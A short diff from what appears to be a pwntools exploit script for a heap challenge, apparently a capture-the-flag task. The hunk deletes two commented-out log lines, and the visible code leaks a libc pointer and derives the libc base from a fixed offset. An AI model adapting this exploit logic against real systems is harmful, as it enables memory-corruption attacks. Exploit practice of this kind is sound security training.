@@ -79,8 +79,6 @@ def main():
     put('0x200 fillup', 0x200, 'fillup again')
 
     libc_leak = u64(get('2')[:6].ljust(8, '\x00'))
-    # log.success("libc base is -> "+ hex( libc_leak ))
-    # p.info('libc leak: 0x%x' % libc_leak)
 
     libc_base = libc_leak - 0x3c4b78
     log.success("libc base is -> "+ hex( libc_base ))
